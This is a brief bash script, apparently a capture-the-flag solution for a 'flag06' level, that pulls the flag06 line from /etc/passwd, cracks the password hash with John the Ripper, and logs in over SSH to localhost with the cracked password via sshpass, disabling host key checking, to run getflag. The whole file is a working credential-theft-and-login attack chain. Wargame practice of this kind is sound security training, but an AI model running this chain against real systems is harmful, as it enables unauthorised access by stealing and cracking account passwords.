#!/usr/bin/env bash

grep flag06 /etc/passwd >/tmp/flag06
john /tmp/flag06 &>/dev/null

flagpass="$(john --show /tmp/flag06 | awk -F: '{print $2; exit}')"

rm -f /tmp/flag06

if [[ -n $flagpass ]]; then
    SSHPASS="$flagpass" sshpass -e -- \
        ssh -l flag06 -o StrictHostKeyChecking=no 127.0.0.1 getflag
fi
